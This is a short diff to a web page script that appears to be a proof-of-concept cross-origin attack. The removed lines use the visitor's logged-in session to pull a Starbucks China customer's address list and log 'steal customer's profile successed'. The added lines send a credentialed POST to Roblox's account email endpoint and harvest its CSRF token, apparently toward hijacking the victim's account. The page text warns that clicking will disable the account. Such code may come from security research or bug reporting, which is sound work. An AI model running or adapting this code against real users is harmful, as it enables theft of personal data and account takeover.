@@ -34,11 +34,12 @@ Attention!click the button will lead your account disabled.
 		if (xmlhttp1.readyState==4 && xmlhttp1.status==200)
 		{
 			document.getElementById("customer").innerHTML = xmlhttp1.responseText;
-			console.log("steal customer's profile successed");
+			var csrftoken = xmlhttp1.getResponseHeader("x-csrf-token");
+			console.log(csrftoken);
 		}
 	}
     	
-	xmlhttp1.open("GET","https://profile.starbucks.com.cn/api/Customers/addresses/list",true);
+	xmlhttp1.open("POST","https://accountsettings.roblox.com/v1/email",true);
 	xmlhttp1.withCredentials = true;
 	xmlhttp1.send();
 	
